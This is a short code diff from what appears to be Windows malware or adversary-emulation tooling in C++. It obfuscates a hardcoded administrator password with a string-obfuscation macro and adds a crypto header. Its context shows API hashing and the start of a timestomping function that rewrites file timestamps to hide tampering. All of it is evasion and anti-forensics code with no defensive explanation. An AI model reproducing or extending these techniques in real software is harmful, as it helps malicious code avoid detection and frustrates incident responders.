@@ -4,8 +4,9 @@
 #include <windows.h>
 #include <string>
 #include "api_hashes.h"
+#include "crypto.h"
 
-#define SIMULATED_ADMIN_PASS L"*TIsoporte"
+#define SIMULATED_ADMIN_PASS STOBFS_W(L"*TIsoporte")
 
 static BOOL Timestomp(LPCWSTR targetPath, LPCWSTR sourcePath) {
     HANDLE hTarget = CreateFileW(targetPath, GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
